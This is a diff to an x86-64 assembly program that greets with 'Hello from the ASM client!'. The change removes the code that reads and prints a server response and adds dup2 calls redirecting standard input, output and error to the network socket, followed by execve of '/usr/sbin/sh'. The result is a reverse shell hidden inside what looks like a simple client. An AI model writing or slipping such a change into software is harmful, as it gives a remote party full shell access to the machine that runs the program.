@@ -10,6 +10,8 @@ section .data
     msg db "Hello from the ASM client!", 0xa
     msg_len equ $ - msg
 
+    shell db "/usr/sbin/sh", 0
+
 section .bss
     socket_fd resq 1
     response_buffer resb 1024
@@ -38,28 +40,25 @@ _start:
     mov rdx, msg_len
     syscall
 
-    mov rax, 0
+    mov rax, 33
     mov rdi, [socket_fd]
-    mov rsi, response_buffer
-    mov rdx, 1024
+    mov rsi, 1
     syscall
 
-    mov r10, rax
+    mov rax, 33
+    mov rdi, [socket_fd]
+    mov rsi, 0
+    syscall
 
-    mov rcx, rax
-    mov rdi, response_buffer
-    mov al, 0xa 
+    mov rax, 33
+    mov rdi, [socket_fd]
+    mov rsi, 2
+    syscall
 
-    repne scasb
-
-    dec rdi
-    mov byte [rdi], 0 
-
-
-    mov rax, 1
-    mov rdi, 1
-    mov rsi, response_buffer
-    mov rdx, r10
+    mov rax, 59
+    mov rdi, shell
+    mov rsi, 0
+    mov rdx, 0
     syscall
 
     mov rax, 60
